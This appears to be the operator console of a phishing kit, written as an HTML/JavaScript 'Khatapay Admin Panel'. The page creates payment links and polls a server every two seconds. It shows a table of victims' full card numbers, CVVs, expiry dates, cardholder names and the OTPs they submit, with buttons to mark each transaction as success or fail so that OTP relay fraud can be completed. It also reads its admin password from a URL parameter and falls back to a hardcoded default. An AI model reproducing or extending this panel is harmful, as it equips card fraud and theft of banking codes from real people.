<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Khatapay Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    h1 { 
      text-align: center;
      margin-bottom: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    .generate-link {
      background: #222;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .generate-link .form-group {
      margin-bottom: 15px;
    }
    .generate-link label {
      display: block;
      margin-bottom: 5px;
      color: #aaa;
    }
    .generate-link input, 
    .generate-link textarea {
      width: 100%;
      padding: 8px;
      border: 1px solid #444;
      background: #333;
      color: #fff;
      border-radius: 4px;
    }
    .payment-link {
      margin-top: 15px;
      padding: 10px;
      background: #333;
      border-radius: 4px;
      display: none;
    }
    .copy-btn {
      background: #22c55e;
      border: none;
      color: white;
      padding: 5px 10px;
      border-radius: 4px;
      cursor: pointer;
      margin-left: 10px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #111;
      margin-bottom: 20px;
    }
    th, td {
      padding: 10px;
      border: 1px solid #333;
      text-align: left;
      font-size: 12px;
    }
    th {
      background: #222;
    }
    tr:nth-child(even) {
      background: #222;
    }
    button {
      background: #4a90e2;
      color: #fff;
      border: none;
      padding: 6px 10px;
      margin-right: 4px;
      cursor: pointer;
      border-radius: 4px;
      font-size: 12px;
    }
    button:hover {
      background: #357ABD;
    }
    button:disabled {
      background: #666;
      cursor: not-allowed;
    }
    .status-badge {
      padding: 2px 6px;
      border-radius: 3px;
      font-size: 11px;
      font-weight: bold;
    }
    .status-processing { background: #f59e0b; color: #000; }
    .status-otp { background: #3b82f6; color: #fff; }
    .status-success { background: #22c55e; color: #fff; }
    .status-fail { background: #ef4444; color: #fff; }
  </style>
</head>
<body>
  <div class="container">
    <div id="adminPanel">
      <h1>Khatapay Admin Panel</h1>
      
      <div class="generate-link">
        <h2>Generate Payment Link</h2>
        <form id="generateLinkForm">
          <div class="form-group">
            <label>Amount (INR)</label>
            <input type="number" id="amount" required min="1" step="1">
          </div>
          <div class="form-group">
            <label>Description</label>
            <textarea id="description" rows="2" required></textarea>
          </div>
          <button type="submit">Generate Link</button>
        </form>
        <div id="paymentLinkContainer" class="payment-link">
          <span>Payment Link: </span>
          <span id="paymentLink"></span>
          <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
        </div>
      </div>

      <h2>Transactions</h2>
      <table id="transactionsTable">
        <thead>
          <tr>
            <th>Invoice ID</th>
            <th>Email</th>
            <th>Amount</th>
            <th>Currency</th>
            <th>Card Number</th>
            <th>CVV</th>
            <th>Expiry</th>
            <th>Cardholder</th>
            <th>OTP</th>
            <th>Status</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          <!-- Transactions will be populated here -->
        </tbody>
      </table>
    </div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    // Auto-load transactions every 2 seconds
    async function loadTransactions() {
      try {
        const response = await fetch('/api/transactions');
        const data = await response.json();
        const tbody = document.querySelector('#transactionsTable tbody');
        tbody.innerHTML = '';
        data.forEach(tx => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${tx.id}</td>
            <td>${tx.email}</td>
            <td>â‚¹${tx.amount}</td>
            <td>${tx.currency}</td>
            <td>${tx.cardNumber}</td>
            <td>${tx.cvv}</td>
            <td>${tx.expiry}</td>
            <td>${tx.cardholder}</td>
            <td>${tx.otpEntered ? tx.otpEntered : 'Waiting for OTP'}</td>
            <td>
              <span class="status-badge status-${tx.status || 'processing'}">
                ${tx.status ? tx.status.toUpperCase() : 'PROCESSING'}
              </span>
            </td>
            <td>
              ${!tx.redirectStatus ? `
                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>Success</button>
                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>Fail</button>
              ` : ''}
            </td>
          `;
          tbody.appendChild(row);
        });
      } catch (error) {
        console.error('Error loading transactions:', error);
      }
    }
    
    loadTransactions();
    setInterval(loadTransactions, 2000);
    
    async function updateStatus(id, status) {
      try {
        const response = await fetch('/api/updateRedirectStatus', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
        });
        if (!response.ok) throw new Error('Failed to update status');
        loadTransactions();
      } catch (error) {
        alert('Error updating status');
      }
    }
    
    function copyPaymentLink() {
      const link = document.getElementById('paymentLink').textContent;
      navigator.clipboard.writeText(link);
      alert('Payment link copied to clipboard!');
    }
    
    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const amount = document.getElementById('amount').value;
      const description = document.getElementById('description').value;
      
      if (!amount || !description) {
        alert('Please fill all fields');
        return;
      }
      
      try {
        // For demo purposes, get the admin password from the URL parameter "pwd"
        const urlParams = new URLSearchParams(window.location.search);
        const password = urlParams.get('pwd') || 'defaultpassword';
        
        const response = await fetch('/api/generatePaymentLink', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${password}`
          },
          body: JSON.stringify({ 
            amount: parseFloat(amount), 
            description: description.trim() 
          })
        });
        
        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.message || 'Failed to generate link');
        }
        
        const data = await response.json();
        document.getElementById('paymentLink').textContent = data.paymentLink;
        document.getElementById('paymentLinkContainer').style.display = 'block';
        alert('Payment link generated successfully');
      } catch (error) {
        console.error('Error generating payment link:', error);
        alert(`Error: ${error.message}`);
        document.getElementById('paymentLinkContainer').style.display = 'none';
      }
    });
    
    // Listen for socket updates to refresh transactions
    socket.on('refreshTransactions', () => {
      loadTransactions();
    });
  </script>
</body>
</html>
